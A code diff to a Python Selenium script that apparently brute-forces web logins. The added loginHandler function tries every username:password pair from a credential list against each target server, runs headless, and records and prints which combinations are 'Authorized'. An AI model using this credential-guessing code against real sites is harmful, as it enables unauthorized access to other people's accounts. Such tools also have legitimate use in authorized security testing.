@@ -3,6 +3,7 @@
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.common.exceptions import NoSuchElementException
+from selenium.webdriver.firefox.options import Options
 from datetime import date
 from optparse import OptionParser
 from colorama import Fore, Back, Style
@@ -52,6 +53,23 @@ def login(browser, target, username, password, delay=1):
         return False, t2-t1
     t2 = time()
     return True, t2-t1
+def loginHandler(thread_index, targets, credentials, delay, headless=True):
+    successful_logins = {}
+    options = Options()
+    options.headless = True if headless else False
+    browser = webdriver.Firefox(options=options)
+    for username, password in credentials:
+        for target in targets:
+            status, time_taken = login(browser, target, username, password, delay)
+            if status == True:
+                successful_logins[target] = [username, password]
+                display(' ', f"Thread {thread_index+1}:{time_taken:.2f}s -> {Fore.CYAN}{username}{Fore.RESET}:{Fore.GREEN}{password}{Fore.RESET}@{Fore.MAGENTA}{target}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
+            elif status == False:
+                display(' ', f"Thread {thread_index+1}:{time_taken:.2f}s -> {Fore.CYAN}{username}{Fore.RESET}:{Fore.GREEN}{password}{Fore.RESET}@{Fore.MAGENTA}{target}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
+            else:
+                display(' ', f"Thread {thread_index+1}:{time_taken:.2f}s -> {Fore.CYAN}{username}{Fore.RESET}:{Fore.GREEN}{password}{Fore.RESET}@{Fore.MAGENTA}{target}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status}{Fore.RESET}{Back.RESET}")
+    browser.close()
+    return successful_logins
 
 if __name__ == "__main__":
     arguments = get_arguments(('-t', "--target", "target", "Target Servers (Seperated by ',' or File Name)"),
